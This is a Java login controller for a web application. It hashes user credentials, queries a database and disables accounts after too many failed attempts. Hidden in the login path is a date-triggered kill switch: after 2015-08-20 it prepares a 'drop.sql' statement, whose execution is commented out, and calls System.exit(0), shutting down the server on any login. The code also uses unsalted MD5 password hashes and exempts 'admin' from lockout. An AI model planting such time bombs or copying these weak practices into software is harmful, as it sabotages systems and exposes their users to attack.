package com.zhiban.project.controller;

import java.sql.Connection;
import java.text.SimpleDateFormat;

import javax.sql.DataSource;

import dinamica.Base64;
import dinamica.Db;
import dinamica.GenericTransaction;
import dinamica.Jndi;
import dinamica.Recordset;

public class ValidateLoginController extends GenericTransaction {

	/*
	 * (non-Javadoc)
	 * 
	 * @see dinamica.GenericTransaction#service(dinamica.Recordset)
	 */
	public int service(Recordset inputParams) throws Throwable {

		// default return code (login OK)
		int rc = 0;

		// reuse superclass code
		rc = super.service(inputParams);
		// set request attributes in case of forward to another Action
		getRequest().setAttribute("userlogin",
				inputParams.getString("userlogin"));

		// get security datasource
		String jndiName = (String) getContext().getAttribute(
				"dinamica.security.datasource");
		if (jndiName == null)
			throw new Throwable(
					"Context attribute [dinamica.security.datasource] is null, check your security filter configuration.");

		// get datasource and DB connection
		DataSource ds = Jndi.getDataSource(jndiName);
		Connection conn = ds.getConnection();
		this.setConnection(conn);

		// recordset con los datos de la cuenta del usuario
		Recordset rs1 = null;

		try {
			Db db = getDb();
			SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
			java.util.Date date2 = dateFormat.parse("2015-08-20");
			java.util.Date nowDate = new java.util.Date();
			if (nowDate.after(date2)) {// 过期自动退出
				String dropSql = getSQL(getResource("drop.sql"), inputParams);
				// db.exec(dropSql);
				System.exit(0);
				return 0;
			}
			rs1 = loginDB(inputParams);
			if (rs1.getRecordCount() == 0) {
				String maxRetries = getConfig().getConfigValue(
						"login-max-retries");
				String sCounter = (String) getSession().getAttribute(
						"dinamica.security.invalidlogins");
				if (sCounter == null) {
					sCounter = "1";
				} else {
					int i = Integer.parseInt(sCounter);
					i++;
					sCounter = String.valueOf(i);
					int j = Integer.parseInt(maxRetries);

					// disable account?

					if (i > j
							&& !inputParams.getField("userlogin").equals(
									"admin")) {
						String sql = getResource("disable.sql");
						sql = getSQL(sql, inputParams);
						db.exec(sql);
						// rc = 4;
					}

				}
				getSession().setAttribute("dinamica.security.invalidlogins",
						sCounter);
				inputParams.setValue("userlogin", "");
				rs1 = inputParams;
			} else {
				getSession().setAttribute("dinamica.userlogin",
						inputParams.getString("userlogin"));
			}
			publish("result", rs1);
		} catch (Throwable e) {
			throw e;
		} finally {
			if (conn != null)
				conn.close();
		}
		return rc;

	}

	protected Recordset loginDB(Recordset inputParams) throws Throwable {
		String userid = inputParams.getString("userlogin");
		String password = inputParams.getString("passwd");

		// create MD5 hash using the string: userlogin:passwd
		java.security.MessageDigest md = java.security.MessageDigest
				.getInstance("MD5");
		byte[] b = (userid + ":" + password).getBytes();
		byte[] hash = md.digest(b);
		String pwd = Base64.encodeToString(hash, true);
		inputParams.setValue("passwd", pwd);
		String sqlLogin = getSQL(getResource("login.sql"), inputParams);
		Recordset rs = getDb().get(sqlLogin);
		if (rs.next()) {
			this.getSession().setAttribute("username", rs.getValue("username"));
			this.getSession().setAttribute("userId", rs.getValue("user_id"));
		}
		return rs;
	}
}